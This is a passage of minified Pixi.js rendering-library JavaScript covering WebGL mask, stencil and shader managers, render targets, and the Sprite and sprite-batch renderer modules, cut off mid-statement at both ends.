n=t("./WebGLManager"),o=t("../filters/SpriteMaskFilter");i.prototype=Object.create(n.prototype),i.prototype.constructor=i,e.exports=i,i.prototype.pushMask=function(t,e){e.texture?this.pushSpriteMask(t,e):this.pushStencilMask(t,e)},i.prototype.popMask=function(t,e){e.texture?this.popSpriteMask(t,e):this.popStencilMask(t,e)},i.prototype.pushSpriteMask=function(t,e){var r=this.alphaMaskPool.pop();r||(r=[new o(e)]),r[0].maskSprite=e,this.renderer.filterManager.pushFilter(t,r)},i.prototype.popSpriteMask=function(){var t=this.renderer.filterManager.popFilter();this.alphaMaskPool.push(t)},i.prototype.pushStencilMask=function(t,e){this.renderer.stencilManager.pushMask(e)},i.prototype.popStencilMask=function(t,e){this.renderer.stencilManager.popMask(e)}},{"../filters/SpriteMaskFilter":51,"./WebGLManager":57}],55:[function(t,e,r){function i(t){n.call(this,t),this.maxAttibs=10,this.attribState=[],this.tempAttribState=[];for(var e=0;e<this.maxAttibs;e++)this.attribState[e]=!1;this.stack=[],this._currentId=-1,this.currentShader=null}var n=t("./WebGLManager"),o=t("../shaders/TextureShader"),s=t("../shaders/ComplexPrimitiveShader"),a=t("../shaders/PrimitiveShader"),h=t("../../../utils");i.prototype=Object.create(n.prototype),i.prototype.constructor=i,h.pluginTarget.mixin(i),e.exports=i,i.prototype.onContextChange=function(){this.initPlugins();var t=this.renderer.gl;this.maxAttibs=t.getParameter(t.MAX_VERTEX_ATTRIBS),this.attribState=[];for(var e=0;e<this.maxAttibs;e++)this.attribState[e]=!1;this.defaultShader=new o(this),this.primitiveShader=new a(this),this.complexPrimitiveShader=new s(this)},i.prototype.setAttribs=function(t){var e;for(e=0;e<this.tempAttribState.length;e++)this.tempAttribState[e]=!1;for(var r in t)this.tempAttribState[t[r]]=!0;var i=this.renderer.gl;for(e=0;e<this.attribState.length;e++)this.attribState[e]!==this.tempAttribState[e]&&(this.attribState[e]=this.tempAttribState[e],this.attribState[e]?i.enableVertexAttribArray(e):i.disableVertexAttribArray(e))},i.prototype.setShader=function(t){return this._currentId===t.uid?!1:(this._currentId=t.uid,this.currentShader=t,this.renderer.gl.useProgram(t.program),this.setAttribs(t.attributes),!0)},i.prototype.destroy=function(){n.prototype.destroy.call(this),this.destroyPlugins(),this.attribState=null,this.tempAttribState=null}},{"../../../utils":76,"../shaders/ComplexPrimitiveShader":58,"../shaders/PrimitiveShader":59,"../shaders/TextureShader":61,"./WebGLManager":57}],56:[function(t,e,r){function i(t){n.call(this,t),this.stencilMaskStack=null}var n=t("./WebGLManager"),o=t("../../../utils");i.prototype=Object.create(n.prototype),i.prototype.constructor=i,e.exports=i,i.prototype.setMaskStack=function(t){this.stencilMaskStack=t;var e=this.renderer.gl;0===t.stencilStack.length?e.disable(e.STENCIL_TEST):e.enable(e.STENCIL_TEST)},i.prototype.pushStencil=function(t,e){this.renderer.currentRenderTarget.attachStencilBuffer();var r=this.renderer.gl,i=this.stencilMaskStack;this.bindGraphics(t,e,this.renderer),0===i.stencilStack.length&&(r.enable(r.STENCIL_TEST),r.clear(r.STENCIL_BUFFER_BIT),i.reverse=!0,i.count=0),i.stencilStack.push(e);var n=i.count;r.colorMask(!1,!1,!1,!1),r.stencilFunc(r.ALWAYS,0,255),r.stencilOp(r.KEEP,r.KEEP,r.INVERT),1===e.mode?(r.drawElements(r.TRIANGLE_FAN,e.indices.length-4,r.UNSIGNED_SHORT,0),i.reverse?(r.stencilFunc(r.EQUAL,255-n,255),r.stencilOp(r.KEEP,r.KEEP,r.DECR)):(r.stencilFunc(r.EQUAL,n,255),r.stencilOp(r.KEEP,r.KEEP,r.INCR)),r.drawElements(r.TRIANGLE_FAN,4,r.UNSIGNED_SHORT,2*(e.indices.length-4)),i.reverse?r.stencilFunc(r.EQUAL,255-(n+1),255):r.stencilFunc(r.EQUAL,n+1,255),i.reverse=!i.reverse):(i.reverse?(r.stencilFunc(r.EQUAL,n,255),r.stencilOp(r.KEEP,r.KEEP,r.INCR)):(r.stencilFunc(r.EQUAL,255-n,255),r.stencilOp(r.KEEP,r.KEEP,r.DECR)),r.drawElements(r.TRIANGLE_STRIP,e.indices.length,r.UNSIGNED_SHORT,0),i.reverse?r.stencilFunc(r.EQUAL,n+1,255):r.stencilFunc(r.EQUAL,255-(n+1),255)),r.colorMask(!0,!0,!0,!0),r.stencilOp(r.KEEP,r.KEEP,r.KEEP),i.count++},i.prototype.bindGraphics=function(t,e){this._currentGraphics=t;var r,i=this.renderer.gl;1===e.mode?(r=this.renderer.shaderManager.complexPrimitiveShader,this.renderer.shaderManager.setShader(r),i.uniformMatrix3fv(r.uniforms.translationMatrix._location,!1,t.worldTransform.toArray(!0)),i.uniformMatrix3fv(r.uniforms.projectionMatrix._location,!1,this.renderer.currentRenderTarget.projectionMatrix.toArray(!0)),i.uniform3fv(r.uniforms.tint._location,o.hex2rgb(t.tint)),i.uniform3fv(r.uniforms.color._location,e.color),i.uniform1f(r.uniforms.alpha._location,t.worldAlpha),i.bindBuffer(i.ARRAY_BUFFER,e.buffer),i.vertexAttribPointer(r.attributes.aVertexPosition,2,i.FLOAT,!1,8,0),i.bindBuffer(i.ELEMENT_ARRAY_BUFFER,e.indexBuffer)):(r=this.renderer.shaderManager.primitiveShader,this.renderer.shaderManager.setShader(r),i.uniformMatrix3fv(r.uniforms.translationMatrix._location,!1,t.worldTransform.toArray(!0)),i.uniformMatrix3fv(r.uniforms.projectionMatrix._location,!1,this.renderer.currentRenderTarget.projectionMatrix.toArray(!0)),i.uniform3fv(r.uniforms.tint._location,o.hex2rgb(t.tint)),i.uniform1f(r.uniforms.alpha._location,t.worldAlpha),i.bindBuffer(i.ARRAY_BUFFER,e.buffer),i.vertexAttribPointer(r.attributes.aVertexPosition,2,i.FLOAT,!1,24,0),i.vertexAttribPointer(r.attributes.aColor,4,i.FLOAT,!1,24,8),i.bindBuffer(i.ELEMENT_ARRAY_BUFFER,e.indexBuffer))},i.prototype.popStencil=function(t,e){var r=this.renderer.gl,i=this.stencilMaskStack;if(i.stencilStack.pop(),i.count--,0===i.stencilStack.length)r.disable(r.STENCIL_TEST);else{var n=i.count;this.bindGraphics(t,e,this.renderer),r.colorMask(!1,!1,!1,!1),1===e.mode?(i.reverse=!i.reverse,i.reverse?(r.stencilFunc(r.EQUAL,255-(n+1),255),r.stencilOp(r.KEEP,r.KEEP,r.INCR)):(r.stencilFunc(r.EQUAL,n+1,255),r.stencilOp(r.KEEP,r.KEEP,r.DECR)),r.drawElements(r.TRIANGLE_FAN,4,r.UNSIGNED_SHORT,2*(e.indices.length-4)),r.stencilFunc(r.ALWAYS,0,255),r.stencilOp(r.KEEP,r.KEEP,r.INVERT),r.drawElements(r.TRIANGLE_FAN,e.indices.length-4,r.UNSIGNED_SHORT,0),i.reverse?r.stencilFunc(r.EQUAL,n,255):r.stencilFunc(r.EQUAL,255-n,255)):(i.reverse?(r.stencilFunc(r.EQUAL,n+1,255),r.stencilOp(r.KEEP,r.KEEP,r.DECR)):(r.stencilFunc(r.EQUAL,255-(n+1),255),r.stencilOp(r.KEEP,r.KEEP,r.INCR)),r.drawElements(r.TRIANGLE_STRIP,e.indices.length,r.UNSIGNED_SHORT,0),i.reverse?r.stencilFunc(r.EQUAL,n,255):r.stencilFunc(r.EQUAL,255-n,255)),r.colorMask(!0,!0,!0,!0),r.stencilOp(r.KEEP,r.KEEP,r.KEEP)}},i.prototype.destroy=function(){n.prototype.destroy.call(this),this.stencilMaskStack.stencilStack=null},i.prototype.pushMask=function(t){this.renderer.setObjectRenderer(this.renderer.plugins.graphics),t.dirty&&this.renderer.plugins.graphics.updateGraphics(t,this.renderer.gl),t._webGL[this.renderer.gl.id].data.length&&this.pushStencil(t,t._webGL[this.renderer.gl.id].data[0],this.renderer)},i.prototype.popMask=function(t){this.renderer.setObjectRenderer(this.renderer.plugins.graphics),this.popStencil(t,t._webGL[this.renderer.gl.id].data[0],this.renderer)}},{"../../../utils":76,"./WebGLManager":57}],57:[function(t,e,r){function i(t){this.renderer=t,this.renderer.on("context",this.onContextChange,this)}i.prototype.constructor=i,e.exports=i,i.prototype.onContextChange=function(){},i.prototype.destroy=function(){this.renderer.off("context",this.onContextChange,this),this.renderer=null}},{}],58:[function(t,e,r){function i(t){n.call(this,t,["attribute vec2 aVertexPosition;","uniform mat3 translationMatrix;","uniform mat3 projectionMatrix;","uniform vec3 tint;","uniform float alpha;","uniform vec3 color;","varying vec4 vColor;","void main(void){","   gl_Position = vec4((projectionMatrix * translationMatrix * vec3(aVertexPosition, 1.0)).xy, 0.0, 1.0);","   vColor = vec4(color * alpha * tint, alpha);","}"].join("\n"),["precision mediump float;","varying vec4 vColor;","void main(void){","   gl_FragColor = vColor;","}"].join("\n"),{tint:{type:"3f",value:[0,0,0]},alpha:{type:"1f",value:0},color:{type:"3f",value:[0,0,0]},translationMatrix:{type:"mat3",value:new Float32Array(9)},projectionMatrix:{type:"mat3",value:new Float32Array(9)}},{aVertexPosition:0})}var n=t("./Shader");i.prototype=Object.create(n.prototype),i.prototype.constructor=i,e.exports=i},{"./Shader":60}],59:[function(t,e,r){function i(t){n.call(this,t,["attribute vec2 aVertexPosition;","attribute vec4 aColor;","uniform mat3 translationMatrix;","uniform mat3 projectionMatrix;","uniform float alpha;","uniform float flipY;","uniform vec3 tint;","varying vec4 vColor;","void main(void){","   gl_Position = vec4((projectionMatrix * translationMatrix * vec3(aVertexPosition, 1.0)).xy, 0.0, 1.0);","   vColor = aColor * vec4(tint * alpha, alpha);","}"].join("\n"),["precision mediump float;","varying vec4 vColor;","void main(void){","   gl_FragColor = vColor;","}"].join("\n"),{tint:{type:"3f",value:[0,0,0]},alpha:{type:"1f",value:0},translationMatrix:{type:"mat3",value:new Float32Array(9)},projectionMatrix:{type:"mat3",value:new Float32Array(9)}},{aVertexPosition:0,aColor:0})}var n=t("./Shader");i.prototype=Object.create(n.prototype),i.prototype.constructor=i,e.exports=i},{"./Shader":60}],60:[function(t,e,r){function i(t,e,r,i,o){if(!e||!r)throw new Error("Pixi.js Error. Shader requires vertexSrc and fragmentSrc");this.uid=n.uid(),this.gl=t.renderer.gl,this.shaderManager=t,this.program=null,this.uniforms=i||{},this.attributes=o||{},this.textureCount=1,this.vertexSrc=e,this.fragmentSrc=r,this.init()}var n=t("../../../utils");i.prototype.constructor=i,e.exports=i,i.prototype.init=function(){this.compile(),this.gl.useProgram(this.program),this.cacheUniformLocations(Object.keys(this.uniforms)),this.cacheAttributeLocations(Object.keys(this.attributes))},i.prototype.cacheUniformLocations=function(t){for(var e=0;e<t.length;++e)this.uniforms[t[e]]._location=this.gl.getUniformLocation(this.program,t[e])},i.prototype.cacheAttributeLocations=function(t){for(var e=0;e<t.length;++e)this.attributes[t[e]]=this.gl.getAttribLocation(this.program,t[e])},i.prototype.compile=function(){var t=this.gl,e=this._glCompile(t.VERTEX_SHADER,this.vertexSrc),r=this._glCompile(t.FRAGMENT_SHADER,this.fragmentSrc),i=t.createProgram();return t.attachShader(i,e),t.attachShader(i,r),t.linkProgram(i),t.getProgramParameter(i,t.LINK_STATUS)||(console.error("Pixi.js Error: Could not initialize shader."),console.error("gl.VALIDATE_STATUS",t.getProgramParameter(i,t.VALIDATE_STATUS)),console.error("gl.getError()",t.getError()),""!==t.getProgramInfoLog(i)&&console.warn("Pixi.js Warning: gl.getProgramInfoLog()",t.getProgramInfoLog(i)),t.deleteProgram(i),i=null),t.deleteShader(e),t.deleteShader(r),this.program=i},i.prototype.syncUniform=function(t){var e,r,i=t._location,o=t.value,s=this.gl;switch(t.type){case"b":case"bool":case"boolean":s.uniform1i(i,o?1:0);break;case"i":case"1i":s.uniform1i(i,o);break;case"f":case"1f":s.uniform1f(i,o);break;case"2f":s.uniform2f(i,o[0],o[1]);break;case"3f":s.uniform3f(i,o[0],o[1],o[2]);break;case"4f":s.uniform4f(i,o[0],o[1],o[2],o[3]);break;case"v2":s.uniform2f(i,o.x,o.y);break;case"v3":s.uniform3f(i,o.x,o.y,o.z);break;case"v4":s.uniform4f(i,o.x,o.y,o.z,o.w);break;case"1iv":s.uniform1iv(i,o);break;case"2iv":s.uniform2iv(i,o);break;case"3iv":s.uniform3iv(i,o);break;case"4iv":s.uniform4iv(i,o);break;case"1fv":s.uniform1fv(i,o);break;case"2fv":s.uniform2fv(i,o);break;case"3fv":s.uniform3fv(i,o);break;case"4fv":s.uniform4fv(i,o);break;case"m2":case"mat2":case"Matrix2fv":s.uniformMatrix2fv(i,t.transpose,o);break;case"m3":case"mat3":case"Matrix3fv":s.uniformMatrix3fv(i,t.transpose,o);break;case"m4":case"mat4":case"Matrix4fv":s.uniformMatrix4fv(i,t.transpose,o);break;case"c":"number"==typeof o&&(o=n.hex2rgb(o)),s.uniform3f(i,o[0],o[1],o[2]);break;case"iv1":s.uniform1iv(i,o);break;case"iv":s.uniform3iv(i,o);break;case"fv1":s.uniform1fv(i,o);break;case"fv":s.uniform3fv(i,o);break;case"v2v":for(t._array||(t._array=new Float32Array(2*o.length)),e=0,r=o.length;r>e;++e)t._array[2*e]=o[e].x,t._array[2*e+1]=o[e].y;s.uniform2fv(i,t._array);break;case"v3v":for(t._array||(t._array=new Float32Array(3*o.length)),e=0,r=o.length;r>e;++e)t._array[3*e]=o[e].x,t._array[3*e+1]=o[e].y,t._array[3*e+2]=o[e].z;s.uniform3fv(i,t._array);break;case"v4v":for(t._array||(t._array=new Float32Array(4*o.length)),e=0,r=o.length;r>e;++e)t._array[4*e]=o[e].x,t._array[4*e+1]=o[e].y,t._array[4*e+2]=o[e].z,t._array[4*e+3]=o[e].w;s.uniform4fv(i,t._array);break;case"t":case"sampler2D":if(!t.value||!t.value.baseTexture.hasLoaded)break;s.activeTexture(s["TEXTURE"+this.textureCount]);var a=t.value.baseTexture._glTextures[s.id];a||(this.initSampler2D(t),a=t.value.baseTexture._glTextures[s.id]),s.bindTexture(s.TEXTURE_2D,a),s.uniform1i(t._location,this.textureCount),this.textureCount++;break;default:console.warn("Pixi.js Shader Warning: Unknown uniform type: "+t.type)}},i.prototype.syncUniforms=function(){this.textureCount=1;for(var t in this.uniforms)this.syncUniform(this.uniforms[t])},i.prototype.initSampler2D=function(t){var e=this.gl,r=t.value.baseTexture;if(r.hasLoaded)if(t.textureData){var i=t.textureData;r._glTextures[e.id]=e.createTexture(),e.bindTexture(e.TEXTURE_2D,r._glTextures[e.id]),e.pixelStorei(e.UNPACK_PREMULTIPLY_ALPHA_WEBGL,r.premultipliedAlpha),e.texImage2D(e.TEXTURE_2D,0,i.luminance?e.LUMINANCE:e.RGBA,e.RGBA,e.UNSIGNED_BYTE,r.source),e.texParameteri(e.TEXTURE_2D,e.TEXTURE_MAG_FILTER,i.magFilter?i.magFilter:e.LINEAR),e.texParameteri(e.TEXTURE_2D,e.TEXTURE_MIN_FILTER,i.wrapS?i.wrapS:e.CLAMP_TO_EDGE),e.texParameteri(e.TEXTURE_2D,e.TEXTURE_WRAP_T,i.wrapS?i.wrapS:e.CLAMP_TO_EDGE),e.texParameteri(e.TEXTURE_2D,e.TEXTURE_WRAP_S,i.wrapT?i.wrapT:e.CLAMP_TO_EDGE)}else this.shaderManager.renderer.updateTexture(r)},i.prototype.destroy=function(){this.gl.deleteProgram(this.program),this.gl=null,this.uniforms=null,this.attributes=null,this.vertexSrc=null,this.fragmentSrc=null},i.prototype._glCompile=function(t,e){var r=this.gl.createShader(t);return this.gl.shaderSource(r,e),this.gl.compileShader(r),this.gl.getShaderParameter(r,this.gl.COMPILE_STATUS)?r:(console.log(this.gl.getShaderInfoLog(r)),null)}},{"../../../utils":76}],61:[function(t,e,r){function i(t,e,r,o,s){var a={uSampler:{type:"sampler2D",value:0},projectionMatrix:{type:"mat3",value:new Float32Array([1,0,0,0,1,0,0,0,1])}};if(o)for(var h in o)a[h]=o[h];var l={aVertexPosition:0,aTextureCoord:0,aColor:0};if(s)for(var u in s)l[u]=s[u];e=e||i.defaultVertexSrc,r=r||i.defaultFragmentSrc,n.call(this,t,e,r,a,l)}var n=t("./Shader");i.prototype=Object.create(n.prototype),i.prototype.constructor=i,e.exports=i,i.defaultVertexSrc=["precision lowp float;","attribute vec2 aVertexPosition;","attribute vec2 aTextureCoord;","attribute vec4 aColor;","uniform mat3 projectionMatrix;","varying vec2 vTextureCoord;","varying vec4 vColor;","void main(void){","   gl_Position = vec4((projectionMatrix * vec3(aVertexPosition, 1.0)).xy, 0.0, 1.0);","   vTextureCoord = aTextureCoord;","   vColor = vec4(aColor.rgb * aColor.a, aColor.a);","}"].join("\n"),i.defaultFragmentSrc=["precision lowp float;","varying vec2 vTextureCoord;","varying vec4 vColor;","uniform sampler2D uSampler;","void main(void){","   gl_FragColor = texture2D(uSampler, vTextureCoord) * vColor ;","}"].join("\n")},{"./Shader":60}],62:[function(t,e,r){function i(t){n.call(this,t)}var n=t("../managers/WebGLManager");i.prototype=Object.create(n.prototype),i.prototype.constructor=i,e.exports=i,i.prototype.start=function(){},i.prototype.stop=function(){this.flush()},i.prototype.flush=function(){},i.prototype.render=function(t){}},{"../managers/WebGLManager":57}],63:[function(t,e,r){function i(t){this.gl=t,this.vertices=new Float32Array([0,0,200,0,200,200,0,200]),this.uvs=new Float32Array([0,0,1,0,1,1,0,1]),this.colors=new Float32Array([1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1]),this.indices=new Uint16Array([0,1,2,0,3,2]),this.vertexBuffer=t.createBuffer(),this.indexBuffer=t.createBuffer(),t.bindBuffer(t.ARRAY_BUFFER,this.vertexBuffer),t.bufferData(t.ARRAY_BUFFER,128,t.DYNAMIC_DRAW),t.bindBuffer(t.ELEMENT_ARRAY_BUFFER,this.indexBuffer),t.bufferData(t.ELEMENT_ARRAY_BUFFER,this.indices,t.STATIC_DRAW),this.upload()}i.prototype.constructor=i,i.prototype.map=function(t,e){var r=0,i=0;this.uvs[0]=r,this.uvs[1]=i,this.uvs[2]=r+e.width/t.width,this.uvs[3]=i,this.uvs[4]=r+e.width/t.width,this.uvs[5]=i+e.height/t.height,this.uvs[6]=r,this.uvs[7]=i+e.height/t.height,r=e.x,i=e.y,this.vertices[0]=r,this.vertices[1]=i,this.vertices[2]=r+e.width,this.vertices[3]=i,this.vertices[4]=r+e.width,this.vertices[5]=i+e.height,this.vertices[6]=r,this.vertices[7]=i+e.height,this.upload()},i.prototype.upload=function(){var t=this.gl;t.bindBuffer(t.ARRAY_BUFFER,this.vertexBuffer),t.bufferSubData(t.ARRAY_BUFFER,0,this.vertices),t.bufferSubData(t.ARRAY_BUFFER,32,this.uvs),t.bufferSubData(t.ARRAY_BUFFER,64,this.colors)},e.exports=i},{}],64:[function(t,e,r){var i=t("../../../math"),n=t("../../../utils"),o=t("../../../const"),s=t("./StencilMaskStack"),a=function(t,e,r,a,h,l){if(this.gl=t,this.frameBuffer=null,this.texture=null,this.size=new i.Rectangle(0,0,1,1),this.resolution=h||o.RESOLUTION,this.projectionMatrix=new i.Matrix,this.transform=null,this.frame=null,this.stencilBuffer=null,this.stencilMaskStack=new s,this.filterStack=[{renderTarget:this,filter:[],bounds:this.size}],this.scaleMode=a||o.SCALE_MODES.DEFAULT,this.root=l,!this.root){this.frameBuffer=t.createFramebuffer(),this.texture=t.createTexture(),t.bindTexture(t.TEXTURE_2D,this.texture),t.texParameteri(t.TEXTURE_2D,t.TEXTURE_MAG_FILTER,a===o.SCALE_MODES.LINEAR?t.LINEAR:t.NEAREST),t.texParameteri(t.TEXTURE_2D,t.TEXTURE_MIN_FILTER,a===o.SCALE_MODES.LINEAR?t.LINEAR:t.NEAREST);var u=n.isPowerOfTwo(e,r);u?(t.texParameteri(t.TEXTURE_2D,t.TEXTURE_WRAP_S,t.REPEAT),t.texParameteri(t.TEXTURE_2D,t.TEXTURE_WRAP_T,t.REPEAT)):(t.texParameteri(t.TEXTURE_2D,t.TEXTURE_WRAP_S,t.CLAMP_TO_EDGE),t.texParameteri(t.TEXTURE_2D,t.TEXTURE_WRAP_T,t.CLAMP_TO_EDGE)),t.bindFramebuffer(t.FRAMEBUFFER,this.frameBuffer),t.framebufferTexture2D(t.FRAMEBUFFER,t.COLOR_ATTACHMENT0,t.TEXTURE_2D,this.texture,0)}this.resize(e,r)};a.prototype.constructor=a,e.exports=a,a.prototype.clear=function(t){var e=this.gl;t&&e.bindFramebuffer(e.FRAMEBUFFER,this.frameBuffer),e.clearColor(0,0,0,0),e.clear(e.COLOR_BUFFER_BIT)},a.prototype.attachStencilBuffer=function(){if(!this.stencilBuffer&&!this.root){var t=this.gl;this.stencilBuffer=t.createRenderbuffer(),t.bindRenderbuffer(t.RENDERBUFFER,this.stencilBuffer),t.framebufferRenderbuffer(t.FRAMEBUFFER,t.DEPTH_STENCIL_ATTACHMENT,t.RENDERBUFFER,this.stencilBuffer),t.renderbufferStorage(t.RENDERBUFFER,t.DEPTH_STENCIL,this.size.width*this.resolution,this.size.height*this.resolution)}},a.prototype.activate=function(){var t=this.gl;t.bindFramebuffer(t.FRAMEBUFFER,this.frameBuffer);var e=this.frame||this.size;this.calculateProjection(e),this.transform&&this.projectionMatrix.append(this.transform),t.viewport(0,0,e.width*this.resolution,e.height*this.resolution)},a.prototype.calculateProjection=function(t){var e=this.projectionMatrix;e.identity(),this.root?(e.a=1/t.width*2,e.d=-1/t.height*2,e.tx=-1-t.x*e.a,e.ty=1-t.y*e.d):(e.a=1/t.width*2,e.d=1/t.height*2,e.tx=-1-t.x*e.a,e.ty=-1-t.y*e.d)},a.prototype.resize=function(t,e){if(t=0|t,e=0|e,this.size.width!==t||this.size.height!==e){if(this.size.width=t,this.size.height=e,!this.root){var r=this.gl;r.bindTexture(r.TEXTURE_2D,this.texture),r.texImage2D(r.TEXTURE_2D,0,r.RGBA,t*this.resolution,e*this.resolution,0,r.RGBA,r.UNSIGNED_BYTE,null),this.stencilBuffer&&(r.bindRenderbuffer(r.RENDERBUFFER,this.stencilBuffer),r.renderbufferStorage(r.RENDERBUFFER,r.DEPTH_STENCIL,t*this.resolution,e*this.resolution))}var i=this.frame||this.size;this.calculateProjection(i)}},a.prototype.destroy=function(){var t=this.gl;t.deleteFramebuffer(this.frameBuffer),t.deleteTexture(this.texture),this.frameBuffer=null,this.texture=null}},{"../../../const":22,"../../../math":32,"../../../utils":76,"./StencilMaskStack":65}],65:[function(t,e,r){function i(){this.stencilStack=[],this.reverse=!0,this.count=0}i.prototype.constructor=i,e.exports=i},{}],66:[function(t,e,r){function i(t){s.call(this),this.anchor=new n.Point,this._texture=null,this._width=0,this._height=0,this.tint=16777215,this.blendMode=l.BLEND_MODES.NORMAL,this.shader=null,this.cachedTint=16777215,this.texture=t||o.EMPTY}var n=t("../math"),o=t("../textures/Texture"),s=t("../display/Container"),a=t("../renderers/canvas/utils/CanvasTinter"),h=t("../utils"),l=t("../const"),u=new n.Point;i.prototype=Object.create(s.prototype),i.prototype.constructor=i,e.exports=i,Object.defineProperties(i.prototype,{width:{get:function(){return this.scale.x*this.texture._frame.width},set:function(t){this.scale.x=t/this.texture._frame.width,this._width=t}},height:{get:function(){return this.scale.y*this.texture._frame.height},set:function(t){this.scale.y=t/this.texture._frame.height,this._height=t}},texture:{get:function(){return this._texture},set:function(t){this._texture!==t&&(this._texture=t,this.cachedTint=16777215,t&&(t.baseTexture.hasLoaded?this._onTextureUpdate():t.once("update",this._onTextureUpdate,this)))}}}),i.prototype._onTextureUpdate=function(){this._width&&(this.scale.x=this._width/this.texture.frame.width),this._height&&(this.scale.y=this._height/this.texture.frame.height)},i.prototype._renderWebGL=function(t){t.setObjectRenderer(t.plugins.sprite),t.plugins.sprite.render(this)},i.prototype.getBounds=function(t){if(!this._currentBounds){var e,r,i,n,o=this._texture._frame.width,s=this._texture._frame.height,a=o*(1-this.anchor.x),h=o*-this.anchor.x,l=s*(1-this.anchor.y),u=s*-this.anchor.y,c=t||this.worldTransform,p=c.a,d=c.b,f=c.c,v=c.d,g=c.tx,m=c.ty;if(0===d&&0===f)0>p&&(p*=-1),0>v&&(v*=-1),e=p*h+g,r=p*a+g,i=v*u+m,n=v*l+m;else{var y=p*h+f*u+g,x=v*u+d*h+m,b=p*a+f*u+g,_=v*u+d*a+m,T=p*a+f*l+g,E=v*l+d*a+m,S=p*h+f*l+g,A=v*l+d*h+m;e=y,e=e>b?b:e,e=e>T?T:e,e=e>S?S:e,i=x,i=i>_?_:i,i=i>E?E:i,i=i>A?A:i,r=y,r=b>r?b:r,r=T>r?T:r,r=S>r?S:r,n=x,n=_>n?_:n,n=E>n?E:n,n=A>n?A:n}if(this.children.length){var w=this.containerGetBounds();a=w.x,h=w.x+w.width,l=w.y,u=w.y+w.height,e=a>e?e:a,i=l>i?i:l,r=r>h?r:h,n=n>u?n:u}var C=this._bounds;C.x=e,C.width=r-e,C.y=i,C.height=n-i,this._currentBounds=C}return this._currentBounds},i.prototype.getLocalBounds=function(){return this._bounds.x=-this._texture._frame.width*this.anchor.x,this._bounds.y=-this._texture._frame.height*this.anchor.y,this._bounds.width=this._texture._frame.width,this._bounds.height=this._texture._frame.height,this._bounds},i.prototype.containsPoint=function(t){this.worldTransform.applyInverse(t,u);var e,r=this._texture._frame.width,i=this._texture._frame.height,n=-r*this.anchor.x;return u.x>n&&u.x<n+r&&(e=-i*this.anchor.y,u.y>e&&u.y<e+i)?!0:!1},i.prototype._renderCanvas=function(t){if(!(this.texture.crop.width<=0||this.texture.crop.height<=0)&&(this.blendMode!==t.currentBlendMode&&(t.currentBlendMode=this.blendMode,t.context.globalCompositeOperation=t.blendModes[t.currentBlendMode]),this.texture.valid)){var e,r,i,n,o=this._texture,s=this.worldTransform;if(t.context.globalAlpha=this.worldAlpha,t.smoothProperty&&t.currentScaleMode!==o.baseTexture.scaleMode&&(t.currentScaleMode=o.baseTexture.scaleMode,t.context[t.smoothProperty]=t.currentScaleMode===l.SCALE_MODES.LINEAR),o.rotate){var h=s.a,u=s.b;s.a=-s.c,s.b=-s.d,s.c=h,s.d=u,i=o.crop.height,n=o.crop.width,e=o.trim?o.trim.y-this.anchor.y*o.trim.height:this.anchor.y*-o._frame.height,r=o.trim?o.trim.x-this.anchor.x*o.trim.width:this.anchor.x*-o._frame.width}else i=o.crop.width,n=o.crop.height,e=o.trim?o.trim.x-this.anchor.x*o.trim.width:this.anchor.x*-o._frame.width,r=o.trim?o.trim.y-this.anchor.y*o.trim.height:this.anchor.y*-o._frame.height;t.roundPixels?(t.context.setTransform(s.a,s.b,s.c,s.d,s.tx*t.resolution|0,s.ty*t.resolution|0),e=0|e,r=0|r):t.context.setTransform(s.a,s.b,s.c,s.d,s.tx*t.resolution,s.ty*t.resolution);var c=o.baseTexture.resolution;16777215!==this.tint?(this.cachedTint!==this.tint&&(this.cachedTint=this.tint,this.tintedTexture=a.getTintedTexture(this,this.tint)),t.context.drawImage(this.tintedTexture,0,0,i*c,n*c,e*t.resolution,r*t.resolution,i*t.resolution,n*t.resolution)):t.context.drawImage(o.baseTexture.source,o.crop.x*c,o.crop.y*c,i*c,n*c,e*t.resolution,r*t.resolution,i*t.resolution,n*t.resolution)}},i.prototype.destroy=function(t,e){s.prototype.destroy.call(this),this.anchor=null,t&&this._texture.destroy(e),this._texture=null,this.shader=null},i.fromFrame=function(t){var e=h.TextureCache[t];if(!e)throw new Error('The frameId "'+t+'" does not exist in the texture cache');
return new i(e)},i.fromImage=function(t,e,r){return new i(o.fromImage(t,e,r))}},{"../const":22,"../display/Container":23,"../math":32,"../renderers/canvas/utils/CanvasTinter":47,"../textures/Texture":71,"../utils":76}],67:[function(t,e,r){function i(t){n.call(this,t),this.vertSize=5,this.vertByteSize=4*this.vertSize,this.size=s.SPRITE_BATCH_SIZE;var e=4*this.size*this.vertByteSize,r=6*this.size;this.vertices=new ArrayBuffer(e),this.positions=new Float32Array(this.vertices),this.colors=new Uint32Array(this.vertices),this.indices=new Uint16Array(r);for(var i=0,o=0;r>i;i+=6,o+=4)this.indices[i+0]=o+0,this.indices[i+1]=o+1,this.indices[i+2]=o+2,this.indices[i+3]=o+0,this.indices[i+4]=o+2,this.indices[i+5]=o+3;this.currentBatchSize=0,this.sprites=[],this.shader=null}var n=t("../../renderers/webgl/utils/ObjectRenderer"),o=t("../../renderers/webgl/WebGLRenderer"),s=t("../../const");i.prototype=Object.create(n.prototype),i.prototype.constructor=i,e.exports=i,o.registerPlugin("sprite",i),i.prototype.onContextChange=function(){var t=this.renderer.gl;this.shader=this.renderer.shaderManager.defaultShader,this.vertexBuffer=t.createBuffer(),this.indexBuffer=t.createBuffer(),t.bindBuffer(t.ELEMENT_ARRAY_BUFFER,this.indexBuffer),t.bufferData(t.ELEMENT_ARRAY_BUFFER,this.indices,t.STATIC_DRAW),t.bindBuffer(t.ARRAY_BUFFER,this.vertexBuffer),t.bufferData(t.ARRAY_BUFFER,this.vertices,t.DYNAMIC_DRAW),this.currentBlendMode=99999},i.prototype.render=function(t){var e=t._texture;this.currentBatchSize>=this.size&&this.flush();var r=e._uvs;if(r){var i,n,o,s,a=t.anchor.x,h=t.anchor.y;if(e.trim){var l=e.trim;n=l.x-a*l.width,i=n+e.crop.width,s=l.y-h*l.height,o=s+e.crop.height}else i=e._frame.width*(1-a),n=e._frame.width*-a,o=e._frame.height*(1-h),s=e._frame.height*-h;var 